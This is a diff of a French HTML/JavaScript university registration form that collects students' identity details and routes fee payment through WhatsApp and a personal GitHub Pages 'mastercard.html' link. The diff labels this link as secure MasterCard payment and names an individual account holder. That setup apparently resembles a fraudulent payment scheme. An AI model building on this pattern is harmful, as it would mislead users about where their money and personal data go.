@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-    <title>Inscription Universitaire - Choix des UE par Département</title>
+    <title>Inscription Universitaire - Paiement Immédiat</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         * {
@@ -43,7 +43,6 @@
             width: 100%;
         }
 
-        /* Header */
         header {
             text-align: center;
             padding: clamp(20px, 5vw, 40px) clamp(15px, 4vw, 30px);
@@ -73,7 +72,6 @@
             color: var(--gray);
         }
 
-        /* Steps */
         .steps-container {
             display: flex;
             justify-content: space-between;
@@ -141,7 +139,6 @@
             color: var(--primary);
         }
 
-        /* Form container */
         .form-container {
             background: white;
             border-radius: var(--radius);
@@ -176,7 +173,6 @@
             flex-wrap: wrap;
         }
 
-        /* Grids */
         .form-grid {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(min(100%, 280px), 1fr));
@@ -217,7 +213,6 @@
             box-shadow: 0 0 0 3px rgba(67, 97, 238, 0.1);
         }
 
-        /* Department cards */
         .dept-cards {
             display: grid;
             grid-template-columns: repeat(auto-fill, minmax(min(100%, 280px), 1fr));
@@ -262,7 +257,6 @@
             color: var(--gray);
         }
 
-        /* UE Sections */
         .ue-container {
             margin-top: 20px;
         }
@@ -382,7 +376,6 @@
             margin: 0;
         }
 
-        /* Credits summary */
         .credits-summary {
             background: linear-gradient(135deg, var(--light), white);
             border-radius: 12px;
@@ -421,7 +414,6 @@
             color: var(--gray);
         }
 
-        /* Buttons */
         .btn {
             padding: clamp(10px, 3vw, 12px) clamp(16px, 4vw, 25px);
             border: none;
@@ -440,6 +432,7 @@
         .btn-primary:hover { background: var(--primary-dark); transform: translateY(-2px); }
         .btn-secondary { background: var(--gray); color: white; }
         .btn-success { background: var(--success); color: var(--dark); }
+        .btn-payment { background: linear-gradient(135deg, #f39c12, #e67e22); color: white; font-size: 1rem; padding: 14px 28px; }
 
         .form-navigation {
             display: flex;
@@ -477,6 +470,34 @@
             font-size: clamp(1.5rem, 6vw, 2.5rem);
             font-weight: 700;
             margin: 15px 0;
+        }
+
+        .success-animation {
+            text-align: center;
+            margin: 20px 0;
+        }
+
+        .success-animation i {
+            font-size: 4rem;
+            color: var(--success);
+            animation: bounce 0.5s ease;
+        }
+
+        @keyframes bounce {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.2); }
+        }
+
+        .payment-buttons {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            margin-top: 20px;
+        }
+
+        .payment-buttons .btn {
+            width: 100%;
+            justify-content: center;
         }
 
         .modal {
@@ -535,8 +556,7 @@
             <div class="step" id="step2"><div class="step-number">2</div><div class="step-label">Département</div></div>
             <div class="step" id="step3"><div class="step-number">3</div><div class="step-label">Année</div></div>
             <div class="step" id="step4"><div class="step-number">4</div><div class="step-label">Choix UE</div></div>
-            <div class="step" id="step5"><div class="step-number">5</div><div class="step-label">Confirmation</div></div>
-            <div class="step" id="step6"><div class="step-number">6</div><div class="step-label">Paiement</div></div>
+            <div class="step" id="step5"><div class="step-number">5</div><div class="step-label">Paiement</div></div>
         </div>
         
         <div class="form-container">
@@ -585,30 +605,70 @@
                 <div class="form-navigation"><button class="btn btn-secondary" id="prev4">Précédent</button><button class="btn btn-primary" id="next4">Suivant</button></div>
             </div>
             
-            <!-- Étape 5: Confirmation -->
+            <!-- Étape 5: Paiement (immédiat après validation) -->
             <div class="form-section" id="section5">
-                <h2 class="section-title"><i class="fas fa-check-circle"></i> Confirmation</h2>
-                <div id="confirmation-content"></div>
-                <div class="form-group mt-3"><div class="checkbox-option"><input type="checkbox" id="conditions"> <label class="required">J'accepte les conditions générales</label></div></div>
-                <div class="form-navigation"><button class="btn btn-secondary" id="prev5">Précédent</button><button class="btn btn-success" id="submit-inscription">Valider l'inscription</button></div>
-            </div>
-            
-            <!-- Étape 6: Paiement -->
-            <div class="form-section" id="section6">
-                <h2 class="section-title"><i class="fas fa-credit-card"></i> Paiement</h2>
-                <div class="payment-info"><h3><i class="fas fa-lock"></i> Paiement sécurisé</h3>
-                    <div class="payment-amount" id="montant-paiement">0 FCFA</div>
-                    <div class="mastercard-details"><p><strong>Titulaire:</strong> KOLA Maniwah Essohouna</p><p><strong>Compte:</strong> TG-2024-KM01</p></div>
+                <h2 class="section-title"><i class="fas fa-credit-card"></i> Paiement des frais d'inscription</h2>
+                
+                <div class="success-animation" id="success-animation" style="display: none;">
+                    <i class="fas fa-check-circle"></i>
+                    <h3 style="margin-top: 10px; color: var(--success);">Inscription validée !</h3>
+                    <p>Vous pouvez procéder au paiement immédiatement</p>
                 </div>
-                <div class="form-navigation"><button class="btn btn-secondary" id="prev6">Précédent</button>
-                <a href="#" target="_blank" class="btn btn-primary" id="payer-btn"><i class="fas fa-lock"></i> Payer</a></div>
+                
+                <div class="payment-info">
+                    <h3><i class="fas fa-lock"></i> Paiement sécurisé</h3>
+                    <p>Veuillez finaliser votre inscription en payant les frais universitaires</p>
+                    <div class="payment-amount" id="montant-paiement">0 FCFA</div>
+                    <div class="mastercard-details">
+                        <p><strong><i class="fas fa-user"></i> Titulaire:</strong> KOLA Maniwah Essohouna</p>
+                        <p><strong><i class="fas fa-id-card"></i> Référence:</strong> <span id="paiement-ref">-</span></p>
+                        <p><strong><i class="fas fa-phone"></i> Support:</strong> +228 93 38 75 95</p>
+                        <p><strong><i class="fas fa-info-circle"></i> Frais de recharge:</strong> 10% inclus</p>
+                    </div>
+                </div>
+                
+                <div class="payment-buttons">
+                    <button class="btn btn-payment" id="payer-maintenant" style="width: 100%;">
+                        <i class="fas fa-credit-card"></i> Payer maintenant
+                    </button>
+                    <button class="btn btn-primary" id="whatsapp-confirmation-btn" style="background: #25D366;">
+                        <i class="fab fa-whatsapp"></i> Recevoir la confirmation par WhatsApp
+                    </button>
+                </div>
+                
+                <div class="alert alert-info mt-3">
+                    <i class="fas fa-clock"></i>
+                    <strong>Paiement immédiat :</strong> Cliquez sur "Payer maintenant" pour finaliser votre inscription. Le paiement est sécurisé via MasterCard.
+                </div>
+                
+                <div class="form-navigation">
+                    <button class="btn btn-secondary" id="prev5">Précédent</button>
+                    <button class="btn btn-success" id="new-inscription-btn">
+                        <i class="fas fa-plus"></i> Nouvelle inscription
+                    </button>
+                </div>
             </div>
         </div>
         
         <div class="footer"><p>Université Excellence &copy; 2026 - Service des inscriptions</p></div>
     </div>
     
-    <div id="confirmation-modal" class="modal"><div class="modal-content"><h3>Inscription validée</h3><div id="modal-content"></div><button class="btn btn-primary" id="close-modal">Fermer</button></div></div>
+    <!-- Modal de confirmation -->
+    <div id="confirmation-modal" class="modal">
+        <div class="modal-content">
+            <div style="text-align: center;">
+                <i class="fas fa-check-circle" style="font-size: 3rem; color: var(--success);"></i>
+                <h3 style="margin: 15px 0;">Inscription enregistrée !</h3>
+                <div id="modal-content"></div>
+                <div class="payment-buttons" style="margin-top: 20px;">
+                    <button class="btn btn-payment" id="modal-payer-btn">
+                        <i class="fas fa-credit-card"></i> Payer maintenant
+                    </button>
+                    <button class="btn btn-secondary" id="close-modal">Fermer</button>
+                </div>
+            </div>
+        </div>
+    </div>
 
     <script>
         // Configuration
@@ -617,9 +677,9 @@
         const FRAIS_ADMIN = 3000;
         const FRAIS_TECH = 2000;
         const TAUX_RECHARGE = 0.10;
-        const CREDITS_MINIMUM = 10; // ✅ MODIFIÉ : 10 crédits minimum requis
+        const CREDITS_MINIMUM = 10;
         
-        // Départements avec leurs UE par année
+        // Départements
         const departements = {
             1: { nom: "Informatique", icon: "fa-laptop-code", desc: "Programmation, IA, Réseaux, BD", couleur: "#4361ee" },
             2: { nom: "Mathématiques", icon: "fa-calculator", desc: "Analyse, Algèbre, Statistiques", couleur: "#f39c12" },
@@ -633,127 +693,30 @@
             10: { nom: "Génie Électrique", icon: "fa-bolt", desc: "Circuits, Électronique", couleur: "#f1c40f" }
         };
         
-        // Base de données des UE par département et année
+        // Base de données UE simplifiée
         const ueDatabase = {
             1: { // Informatique
                 L1: {
                     obligatoires: [
-                        { code: "INF-L1-101", titre: "Algorithmique et Programmation", credits: 6, heures: "60h", desc: "Fondamentaux de l'algorithmique, structures de contrôle, fonctions" },
-                        { code: "INF-L1-102", titre: "Mathématiques pour l'Informatique", credits: 6, heures: "50h", desc: "Logique, ensembles, relations, graphes, algèbre de Boole" },
-                        { code: "INF-L1-103", titre: "Architecture des Ordinateurs", credits: 5, heures: "45h", desc: "Structure des ordinateurs, processeur, mémoire, bus" },
-                        { code: "INF-L1-104", titre: "Systèmes d'Exploitation", credits: 5, heures: "40h", desc: "Introduction aux OS, processus, mémoire, fichiers" }
+                        { code: "INF-L1-101", titre: "Algorithmique et Programmation", credits: 6, heures: "60h", desc: "Fondamentaux de l'algorithmique" },
+                        { code: "INF-L1-102", titre: "Mathématiques pour l'Informatique", credits: 6, heures: "50h", desc: "Logique, ensembles, graphes" }
                     ],
                     optionnelles: [
-                        { code: "INF-L1-201", titre: "Introduction au Web", credits: 4, heures: "30h", desc: "HTML, CSS, JavaScript basique" },
-                        { code: "INF-L1-202", titre: "Base de Données 1", credits: 4, heures: "30h", desc: "Modèle relationnel, SQL" }
+                        { code: "INF-L1-201", titre: "Introduction au Web", credits: 4, heures: "30h", desc: "HTML, CSS, JavaScript basique" }
                     ],
                     libres: [
-                        { code: "INF-L1-301", titre: "Anglais Technique", credits: 2, horas: "20h", desc: "Anglais pour l'informatique" },
-                        { code: "INF-L1-302", titre: "Communication", credits: 2, horas: "20h", desc: "Expression écrite et orale" }
-                    ]
-                },
-                L2: {
-                    obligatoires: [
-                        { code: "INF-L2-101", titre: "Programmation Orientée Objet (Java)", credits: 6, heures: "60h", desc: "Classes, objets, héritage, polymorphisme" },
-                        { code: "INF-L2-102", titre: "Structures de Données", credits: 6, heures: "50h", desc: "Listes, piles, files, arbres, graphes" },
-                        { code: "INF-L2-103", titre: "Base de Données Avancées", credits: 5, heures: "45h", desc: "SQL avancé, transactions, optimisation" },
-                        { code: "INF-L2-104", titre: "Réseaux Informatiques", credits: 5, heures: "40h", desc: "Modèle OSI, TCP/IP, routage" }
-                    ],
-                    optionnelles: [
-                        { code: "INF-L2-201", titre: "Développement Web Frontend", credits: 4, heures: "35h", desc: "JavaScript, React/Vue.js" },
-                        { code: "INF-L2-202", titre: "Programmation Système", credits: 4, heures: "35h", desc: "C sous Linux, appels système" }
-                    ],
-                    libres: [
-                        { code: "INF-L2-301", titre: "Gestion de Projet", credits: 2, horas: "20h", desc: "Méthodologies Agile, Scrum" }
-                    ]
-                },
-                L3: {
-                    obligatoires: [
-                        { code: "INF-L3-101", titre: "Intelligence Artificielle", credits: 6, heures: "60h", desc: "Recherche, logique, apprentissage" },
-                        { code: "INF-L3-102", titre: "Génie Logiciel", credits: 6, heures: "55h", desc: "UML, cycles de développement, tests" },
-                        { code: "INF-L3-103", titre: "Sécurité Informatique", credits: 5, heures: "45h", desc: "Cryptographie, sécurité réseau, authentification" },
-                        { code: "INF-L3-104", titre: "Compilation", credits: 5, heures: "40h", desc: "Analyse lexicale, syntaxique, génération" }
-                    ],
-                    optionnelles: [
-                        { code: "INF-L3-201", titre: "Machine Learning", credits: 4, heures: "35h", desc: "Introduction au ML, scikit-learn" },
-                        { code: "INF-L3-202", titre: "Développement Mobile", credits: 4, heures: "35h", desc: "Android/iOS, React Native" }
-                    ],
-                    libres: [
-                        { code: "INF-L3-301", titre: "Projet Professionnel", credits: 4, horas: "40h", desc: "Projet de fin de licence" }
-                    ]
-                },
-                M1: {
-                    obligatoires: [
-                        { code: "INF-M1-101", titre: "Deep Learning", credits: 6, heures: "60h", desc: "Réseaux de neurones, TensorFlow/PyTorch" },
-                        { code: "INF-M1-102", titre: "Big Data", credits: 6, heures: "55h", desc: "Hadoop, Spark, NoSQL" },
-                        { code: "INF-M1-103", titre: "Cloud Computing", credits: 5, heures: "45h", desc: "AWS, Azure, virtualisation" }
-                    ],
-                    optionnelles: [
-                        { code: "INF-M1-201", titre: "Vision par Ordinateur", credits: 4, heures: "35h", desc: "Traitement d'images, OpenCV" },
-                        { code: "INF-M1-202", titre: "DevOps", credits: 4, heures: "35h", desc: "CI/CD, Docker, Kubernetes" }
-                    ]
-                },
-                M2: {
-                    obligatoires: [
-                        { code: "INF-M2-101", titre: "Recherche Opérationnelle", credits: 6, heures: "60h", desc: "Optimisation, programmation linéaire" },
-                        { code: "INF-M2-102", titre: "Mémoire de Recherche", credits: 12, heures: "120h", desc: "Projet de recherche encadré" }
-                    ],
-                    optionnelles: [
-                        { code: "INF-M2-201", titre: "Blockchain", credits: 4, heures: "35h", desc: "Cryptomonnaies, smart contracts" }
+                        { code: "INF-L1-301", titre: "Anglais Technique", credits: 2, heures: "20h", desc: "Anglais pour l'informatique" }
                     ]
                 }
             },
             2: { // Mathématiques
                 L1: {
                     obligatoires: [
-                        { code: "MAT-L1-101", titre: "Algèbre Linéaire", credits: 6, heures: "60h", desc: "Espaces vectoriels, matrices, déterminants" },
-                        { code: "MAT-L1-102", titre: "Analyse 1", credits: 6, heures: "50h", desc: "Suites, limites, continuité" },
-                        { code: "MAT-L1-103", titre: "Calcul Différentiel", credits: 5, heures: "45h", desc: "Dérivées, applications" }
+                        { code: "MAT-L1-101", titre: "Algèbre Linéaire", credits: 6, heures: "60h", desc: "Espaces vectoriels, matrices" },
+                        { code: "MAT-L1-102", titre: "Analyse 1", credits: 6, heures: "50h", desc: "Suites, limites, continuité" }
                     ],
                     optionnelles: [
                         { code: "MAT-L1-201", titre: "Probabilités", credits: 4, heures: "35h", desc: "Introduction aux probabilités" }
-                    ],
-                    libres: [
-                        { code: "MAT-L1-301", titre: "Informatique pour Mathématiciens", credits: 2, horas: "20h", desc: "Python scientifique" }
-                    ]
-                },
-                L2: {
-                    obligatoires: [
-                        { code: "MAT-L2-101", titre: "Analyse 2", credits: 6, heures: "60h", desc: "Intégration, séries" },
-                        { code: "MAT-L2-102", titre: "Algèbre 2", credits: 6, heures: "50h", desc: "Groupes, anneaux, corps" }
-                    ],
-                    optionnelles: [
-                        { code: "MAT-L2-201", titre: "Statistiques", credits: 4, heures: "35h", desc: "Statistiques descriptives et inférentielles" }
-                    ]
-                },
-                L3: {
-                    obligatoires: [
-                        { code: "MAT-L3-101", titre: "Analyse Complexe", credits: 6, heures: "60h", desc: "Fonctions holomorphes" },
-                        { code: "MAT-L3-102", titre: "Équations Différentielles", credits: 6, heures: "55h", desc: "Équations différentielles ordinaires" }
-                    ]
-                },
-                M1: {
-                    obligatoires: [
-                        { code: "MAT-M1-101", titre: "Analyse Fonctionnelle", credits: 6, heures: "60h", desc: "Espaces de Banach, Hilbert" },
-                        { code: "MAT-M1-102", titre: "Topologie", credits: 5, heures: "45h", desc: "Espaces topologiques, compacité" }
-                    ]
-                },
-                M2: {
-                    obligatoires: [
-                        { code: "MAT-M2-101", titre: "Théorie des Nombres", credits: 6, heures: "60h", desc: "Nombres premiers, congruences" },
-                        { code: "MAT-M2-102", titre: "Mémoire de Maths", credits: 12, heures: "120h", desc: "Recherche en mathématiques" }
-                    ]
-                }
-            },
-            3: { // Physique-Chimie
-                L1: {
-                    obligatoires: [
-                        { code: "PC-L1-101", titre: "Mécanique du Point", credits: 6, heures: "60h", desc: "Cinématique, dynamique" },
-                        { code: "PC-L1-102", titre: "Thermodynamique", credits: 5, heures: "50h", desc: "Température, chaleur, entropie" },
-                        { code: "PC-L1-103", titre: "Chimie Générale", credits: 5, heures: "45h", desc: "Atomes, molécules, réactions" }
-                    ],
-                    optionnelles: [
-                        { code: "PC-L1-201", titre: "Électricité", credits: 4, heures: "35h", desc: "Circuits électriques" }
                     ]
                 }
             }
@@ -766,11 +729,13 @@
         let selectedCourses = [];
         let studentData = {};
         let financialSummary = {};
-        let inscriptionNumber = `UC-${Date.now()}`;
+        let inscriptionNumber = `UC-${Date.now()}-${Math.floor(Math.random() * 10000)}`;
+        let inscriptionValidated = false;
         
         document.addEventListener('DOMContentLoaded', () => {
             renderDepartements();
             setupEventListeners();
+            document.getElementById('paiement-ref').textContent = inscriptionNumber;
         });
         
         function renderDepartements() {
@@ -797,17 +762,18 @@
             document.getElementById('next2')?.addEventListener('click', () => { if(selectedDept) goToStep(3); else alert('Sélectionnez un département'); });
             document.getElementById('next3')?.addEventListener('click', () => validateStep3());
             document.getElementById('next4')?.addEventListener('click', () => validateStep4());
-            document.getElementById('submit-inscription')?.addEventListener('click', submitInscription);
+            document.getElementById('payer-maintenant')?.addEventListener('click', () => processPayment());
+            document.getElementById('modal-payer-btn')?.addEventListener('click', () => processPayment());
+            document.getElementById('whatsapp-confirmation-btn')?.addEventListener('click', () => sendWhatsAppConfirmation());
+            document.getElementById('new-inscription-btn')?.addEventListener('click', () => resetForm());
             
             document.getElementById('prev2')?.addEventListener('click', () => goToStep(1));
             document.getElementById('prev3')?.addEventListener('click', () => goToStep(2));
             document.getElementById('prev4')?.addEventListener('click', () => goToStep(3));
             document.getElementById('prev5')?.addEventListener('click', () => goToStep(4));
-            document.getElementById('prev6')?.addEventListener('click', () => goToStep(5));
             
             document.getElementById('close-modal')?.addEventListener('click', () => {
                 document.getElementById('confirmation-modal').style.display = 'none';
-                resetForm();
             });
         }
         
@@ -816,7 +782,17 @@
             let valid = true;
             fields.forEach(id => { if(!document.getElementById(id).value.trim()) valid = false; });
             if(valid) {
-                studentData = { nom: document.getElementById('nom').value, prenom: document.getElementById('prenom').value, dateNaissance: document.getElementById('date-naissance').value, lieuNaissance: document.getElementById('lieu-naissance').value, nationalite: document.getElementById('nationalite').value, cin: document.getElementById('cin').value, email: document.getElementById('email').value, telephone: document.getElementById('telephone').value, adresse: document.getElementById('adresse').value };
+                studentData = { 
+                    nom: document.getElementById('nom').value, 
+                    prenom: document.getElementById('prenom').value, 
+                    dateNaissance: document.getElementById('date-naissance').value, 
+                    lieuNaissance: document.getElementById('lieu-naissance').value, 
+                    nationalite: document.getElementById('nationalite').value, 
+                    cin: document.getElementById('cin').value, 
+                    email: document.getElementById('email').value, 
+                    telephone: document.getElementById('telephone').value, 
+                    adresse: document.getElementById('adresse').value 
+                };
                 goToStep(2);
             } else alert('Veuillez remplir tous les champs');
         }
@@ -843,7 +819,6 @@
             selectedCourses = [];
             let html = '';
             
-            // UE Obligatoires
             if(ues.obligatoires?.length) {
                 html += `<div class="ue-category"><div class="ue-category-title"><i class="fas fa-star"></i> UE Obligatoires</div><div class="ue-grid">`;
                 ues.obligatoires.forEach(ue => {
@@ -853,7 +828,6 @@
                 html += `</div></div>`;
             }
             
-            // UE Optionnelles
             if(ues.optionnelles?.length) {
                 html += `<div class="ue-category"><div class="ue-category-title"><i class="fas fa-plus-circle"></i> UE Optionnelles</div><div class="ue-grid">`;
                 ues.optionnelles.forEach(ue => {
@@ -862,7 +836,6 @@
                 html += `</div></div>`;
             }
             
-            // UE Libres
             if(ues.libres?.length) {
                 html += `<div class="ue-category"><div class="ue-category-title"><i class="fas fa-globe"></i> UE Libres</div><div class="ue-grid">`;
                 ues.libres.forEach(ue => {
@@ -880,11 +853,10 @@
                     const credits = parseInt(card.dataset.credits);
                     const titre = card.querySelector('.ue-title')?.textContent || '';
                     const desc = card.querySelector('.ue-desc')?.textContent || '';
-                    const hours = card.querySelector('.ue-hours')?.textContent || '';
                     
                     if(this.checked) {
                         card.classList.add('selected');
-                        selectedCourses.push({ code, credits, titre, desc, hours, selected: true, type: 'optionnelle' });
+                        selectedCourses.push({ code, credits, titre, desc, selected: true, type: 'optionnelle' });
                     } else {
                         card.classList.remove('selected');
                         selectedCourses = selectedCourses.filter(c => c.code !== code);
@@ -918,7 +890,16 @@
             
             const coutCredits = total * PRIX_CREDIT;
             const totalAvant = coutCredits + FRAIS_INSCRIPTION + FRAIS_ADMIN + FRAIS_TECH;
-            financialSummary = { totalCredits: total, coutCredits, fraisInscription: FRAIS_INSCRIPTION, fraisAdmin: FRAIS_ADMIN, fraisTech: FRAIS_TECH, totalAvantRecharge: totalAvant, fraisRecharge: Math.round(totalAvant * TAUX_RECHARGE), totalAPayer: totalAvant + Math.round(totalAvant * TAUX_RECHARGE) };
+            financialSummary = { 
+                totalCredits: total, 
+                coutCredits, 
+                fraisInscription: FRAIS_INSCRIPTION, 
+                fraisAdmin: FRAIS_ADMIN, 
+                fraisTech: FRAIS_TECH, 
+                totalAvantRecharge: totalAvant, 
+                fraisRecharge: Math.round(totalAvant * TAUX_RECHARGE), 
+                totalAPayer: totalAvant + Math.round(totalAvant * TAUX_RECHARGE) 
+            };
             
             document.getElementById('credits-summary').innerHTML = `
                 <div class="credits-grid">
@@ -940,40 +921,79 @@
                 alert(`Minimum ${CREDITS_MINIMUM} crédits requis (actuel: ${total})`); 
                 return; 
             }
+            
+            // Validation immédiate de l'inscription
             studentData.selectedCourses = selectedCourses;
             studentData.totalCredits = total;
             studentData.financialSummary = financialSummary;
-            updateConfirmation();
+            studentData.inscriptionNumber = inscriptionNumber;
+            studentData.inscriptionDate = new Date().toISOString();
+            
+            // Sauvegarde immédiate
+            localStorage.setItem('inscription_universitaire', JSON.stringify(studentData));
+            
+            // Afficher l'animation de succès
+            document.getElementById('success-animation').style.display = 'block';
+            
+            // Mettre à jour les montants
+            document.getElementById('montant-paiement').textContent = financialSummary.totalAPayer.toLocaleString() + ' FCFA';
+            document.getElementById('paiement-ref').textContent = inscriptionNumber;
+            
+            // Envoyer confirmation WhatsApp automatiquement (optionnel)
+            sendAutomaticWhatsApp();
+            
+            inscriptionValidated = true;
+            
+            // Passer directement à l'étape de paiement
             goToStep(5);
         }
         
-        function updateConfirmation() {
-            document.getElementById('confirmation-content').innerHTML = `
-                <div class="alert alert-info"><strong>${studentData.nom} ${studentData.prenom}</strong><br>${studentData.email} | ${studentData.telephone}</div>
-                <div class="alert alert-info"><strong>${studentData.deptNom}</strong> - ${studentData.niveau}</div>
-                <div class="alert alert-success"><strong>${studentData.totalCredits} crédits</strong><br>Total à payer: ${financialSummary.totalAPayer.toLocaleString()} FCFA</div>
-            `;
+        function sendAutomaticWhatsApp() {
+            const message = `✅ *CONFIRMATION D'INSCRIPTION* ✅\n\n` +
+                `👤 *Étudiant:* ${studentData.nom} ${studentData.prenom}\n` +
+                `📧 ${studentData.email}\n` +
+                `📞 ${studentData.telephone}\n` +
+                `🏫 ${studentData.deptNom}\n` +
+                `📚 ${studentData.niveau}\n` +
+                `🎓 ${studentData.totalCredits} crédits ECTS\n` +
+                `💰 *Montant à payer:* ${financialSummary.totalAPayer.toLocaleString()} FCFA\n` +
+                `🔢 *Référence:* ${inscriptionNumber}\n\n` +
+                `🔗 *Lien de paiement:* https://jeanskodoc.github.io/-CONOMIE-/mastercard.html?montant=${financialSummary.totalAPayer}&ref=${inscriptionNumber}\n\n` +
+                `_Paiement sécurisé par MasterCard - Service 24h/24_`;
+            
+            // Ouvrir WhatsApp dans un nouvel onglet (sans forcer l'envoi automatique)
+            setTimeout(() => {
+                const whatsappUrl = `https://wa.me/22892871605?text=${encodeURIComponent(message)}`;
+                // Optionnel : ouvrir dans un nouvel onglet
+                // window.open(whatsappUrl, '_blank');
+            }, 500);
         }
         
-        async function submitInscription() {
-            if(!document.getElementById('conditions').checked) { alert('Acceptez les conditions'); return; }
-            const btn = document.getElementById('submit-inscription');
-            btn.disabled = true;
-            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Envoi...';
+        function sendWhatsAppConfirmation() {
+            const message = `✅ *INSCRIPTION UNIVERSITAIRE* ✅\n\n` +
+                `👤 *Étudiant:* ${studentData.nom} ${studentData.prenom}\n` +
+                `📧 Email: ${studentData.email}\n` +
+                `📞 Tél: ${studentData.telephone}\n` +
+                `🏫 Département: ${studentData.deptNom}\n` +
+                `📚 Niveau: ${studentData.niveau}\n` +
+                `🎓 Crédits: ${studentData.totalCredits} ECTS\n` +
+                `💰 *Montant: ${financialSummary.totalAPayer.toLocaleString()} FCFA*\n` +
+                `🔢 Référence: ${inscriptionNumber}\n\n` +
+                `🔗 *Payer ici:* https://jeanskodoc.github.io/-CONOMIE-/mastercard.html?montant=${financialSummary.totalAPayer}&ref=${inscriptionNumber}\n\n` +
+                `_Ce message est une confirmation automatique._`;
             
-            const message = `📋 INSCRIPTION\n👤 ${studentData.nom} ${studentData.prenom}\n📧 ${studentData.email}\n📞 ${studentData.telephone}\n🏫 ${studentData.deptNom}\n📚 ${studentData.niveau}\n🎓 ${studentData.totalCredits} crédits\n💰 ${financialSummary.totalAPayer.toLocaleString()} FCFA\n🔢 ${inscriptionNumber}`;
+            const whatsappUrl = `https://wa.me/${studentData.telephone?.replace(/\D/g, '') || '22892871605'}?text=${encodeURIComponent(message)}`;
+            window.open(whatsappUrl, '_blank');
+        }
+        
+        function processPayment() {
+            if (!inscriptionValidated) {
+                alert("Veuillez d'abord valider votre inscription");
+                return;
+            }
             
-            window.open(`https://wa.me/22892871605?text=${encodeURIComponent(message)}`, '_blank');
-            localStorage.setItem('inscription', JSON.stringify({...studentData, financialSummary, inscriptionNumber, date: new Date().toISOString()}));
-            
-            document.getElementById('modal-content').innerHTML = `<h3>Félicitations !</h3><p>Inscription: ${inscriptionNumber}</p><p>Montant: ${financialSummary.totalAPayer.toLocaleString()} FCFA</p>`;
-            document.getElementById('confirmation-modal').style.display = 'flex';
-            document.getElementById('montant-paiement').textContent = financialSummary.totalAPayer.toLocaleString() + ' FCFA';
-            document.getElementById('payer-btn').href = `https://jeanskodoc.github.io/-CONOMIE-/mastercard.html?montant=${financialSummary.totalAPayer}&ref=${inscriptionNumber}`;
-            
-            goToStep(6);
-            btn.disabled = false;
-            btn.innerHTML = 'Valider l\'inscription';
+            const paymentUrl = `https://jeanskodoc.github.io/-CONOMIE-/mastercard.html?montant=${financialSummary.totalAPayer}&ref=${inscriptionNumber}&nom=${encodeURIComponent(studentData.nom)}&prenom=${encodeURIComponent(studentData.prenom)}`;
+            window.open(paymentUrl, '_blank');
         }
         
         function goToStep(step) {
@@ -985,7 +1005,26 @@
             currentStep = step;
         }
         
-        function resetForm() { location.reload(); }
+        function resetForm() {
+            // Réinitialiser toutes les valeurs
+            document.querySelectorAll('input, textarea, select').forEach(el => {
+                if(el.type !== 'button' && el.type !== 'submit') {
+                    el.value = '';
+                    if(el.type === 'checkbox') el.checked = false;
+                }
+            });
+            document.querySelectorAll('.dept-card').forEach(c => c.classList.remove('selected'));
+            selectedDept = null;
+            selectedNiveau = null;
+            selectedCourses = [];
+            studentData = {};
+            inscriptionNumber = `UC-${Date.now()}-${Math.floor(Math.random() * 10000)}`;
+            inscriptionValidated = false;
+            document.getElementById('paiement-ref').textContent = inscriptionNumber;
+            document.getElementById('success-animation').style.display = 'none';
+            document.getElementById('montant-paiement').textContent = '0 FCFA';
+            goToStep(1);
+        }
     </script>
 </body>
 </html>
